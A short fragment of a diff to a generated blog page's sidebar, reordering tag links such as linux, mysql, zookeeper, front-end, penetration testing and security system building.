+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -5256,9 +5685,9 @@
     
         <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
-        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+        <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
     
-        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
